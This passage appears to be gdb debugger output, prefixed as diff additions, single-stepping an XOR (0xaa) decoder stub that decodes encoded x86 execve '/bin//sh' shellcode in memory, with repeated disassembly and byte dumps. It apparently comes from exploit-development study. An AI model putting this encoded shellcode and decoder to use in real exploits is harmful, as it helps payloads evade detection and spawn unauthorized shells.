+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xaa    0xc0    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a04f in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+=> 0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    DWORD PTR [edx-0x55af5540],ebp
+   0x0804a06a <+42>:    push   0x2faa2faa
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xaa    0xc0    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a052 in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+=> 0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    DWORD PTR [edx-0x55af5540],ebp
+   0x0804a06a <+42>:    push   0x2faa2faa
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xaa    0xc0    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a054 in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+=> 0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    DWORD PTR [edx-0x55af5540],ebp
+   0x0804a06a <+42>:    push   0x2faa2faa
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xaa    0xc0    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a058 in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    shr    BYTE PTR [edx-0x559755b0],0x2f
+   0x0804a06d <+45>:    stos   BYTE PTR es:[edi],al
+   0x0804a06e <+46>:    das
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0xc0    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a05a in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+=> 0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    shr    BYTE PTR [edx-0x559755b0],0x2f
+   0x0804a06d <+45>:    stos   BYTE PTR es:[edi],al
+   0x0804a06e <+46>:    das
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0xc0    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a05b in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+=> 0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    shr    BYTE PTR [edx-0x559755b0],0x2f
+   0x0804a06d <+45>:    stos   BYTE PTR es:[edi],al
+   0x0804a06e <+46>:    das
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0xc0    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a05d in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+=> 0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    shr    BYTE PTR [edx-0x559755b0],0x2f
+   0x0804a06d <+45>:    stos   BYTE PTR es:[edi],al
+   0x0804a06e <+46>:    das
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0xc0    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a04c in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+=> 0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    shr    BYTE PTR [edx-0x559755b0],0x2f
+   0x0804a06d <+45>:    stos   BYTE PTR es:[edi],al
+   0x0804a06e <+46>:    das
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0xc0    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a04f in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+=> 0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    shr    BYTE PTR [edx-0x559755b0],0x2f
+   0x0804a06d <+45>:    stos   BYTE PTR es:[edi],al
+   0x0804a06e <+46>:    das
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0xc0    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a052 in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+=> 0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    shr    BYTE PTR [edx-0x559755b0],0x2f
+   0x0804a06d <+45>:    stos   BYTE PTR es:[edi],al
+   0x0804a06e <+46>:    das
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0xc0    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a054 in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+=> 0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    shr    BYTE PTR [edx-0x559755b0],0x2f
+   0x0804a06d <+45>:    stos   BYTE PTR es:[edi],al
+   0x0804a06e <+46>:    das
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0xc0    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a058 in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+=> 0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    stos   BYTE PTR es:[edi],al
+   0x0804a068 <+40>:    push   eax
+   0x0804a069 <+41>:    stos   BYTE PTR es:[edi],al
+   0x0804a06a <+42>:    push   0x2faa2faa
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a05a in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+=> 0x0804a05b <+27>:    add    al,0x2
+   0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    stos   BYTE PTR es:[edi],al
+   0x0804a068 <+40>:    push   eax
+   0x0804a069 <+41>:    stos   BYTE PTR es:[edi],al
+   0x0804a06a <+42>:    push   0x2faa2faa
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
+   0x0804a084 <+68>:    mov    DWORD PTR [edx-0x55ac551e],ebp
+   0x0804a08a <+74>:    mov    DWORD PTR [edx-0x554f551f],ebp
+   0x0804a090 <+80>:    or     ebp,DWORD PTR [edx-0x557f5533]
+   0x0804a096 <+86>:    mov    ebx,0xbb
+End of assembler dump.
+0x804a064 <code+36>:    0x31    0xc0    0x50    0xaa    0x50    0xaa    0x68    0xaa
+0x804a06c <code+44>:    0x2f    0xaa    0x2f    0xaa    0x73    0xaa    0x68    0xaa
+0x804a074 <code+52>:    0x68    0xaa    0x2f    0xaa
+0x0804a05b in code ()
+(gdb)
+Dump of assembler code for function code:
+   0x0804a040 <+0>:     jmp    0x804a05f <code+31>
+   0x0804a042 <+2>:     pop    esi
+   0x0804a043 <+3>:     lea    edi,[esi+0x1]
+   0x0804a046 <+6>:     xor    eax,eax
+   0x0804a048 <+8>:     mov    al,0x1
+   0x0804a04a <+10>:    xor    ebx,ebx
+   0x0804a04c <+12>:    mov    bl,BYTE PTR [esi+eax*1]
+   0x0804a04f <+15>:    xor    bl,0xaa
+   0x0804a052 <+18>:    jne    0x804a064 <code+36>
+   0x0804a054 <+20>:    mov    bl,BYTE PTR [esi+eax*1+0x1]
+   0x0804a058 <+24>:    mov    BYTE PTR [edi],bl
+   0x0804a05a <+26>:    inc    edi
+   0x0804a05b <+27>:    add    al,0x2
+=> 0x0804a05d <+29>:    jmp    0x804a04c <code+12>
+   0x0804a05f <+31>:    call   0x804a042 <code+2>
+   0x0804a064 <+36>:    xor    eax,eax
+   0x0804a066 <+38>:    push   eax
+   0x0804a067 <+39>:    stos   BYTE PTR es:[edi],al
+   0x0804a068 <+40>:    push   eax
+   0x0804a069 <+41>:    stos   BYTE PTR es:[edi],al
+   0x0804a06a <+42>:    push   0x2faa2faa
+   0x0804a06f <+47>:    stos   BYTE PTR es:[edi],al
+   0x0804a070 <+48>:    jae    0x804a01c
+   0x0804a072 <+50>:    push   0x2faa68aa
+   0x0804a077 <+55>:    stos   BYTE PTR es:[edi],al
+   0x0804a078 <+56>:    bound  ebp,QWORD PTR [edx-0x55915597]
+   0x0804a07e <+62>:    mov    DWORD PTR [edx-0x55af551d],ebp
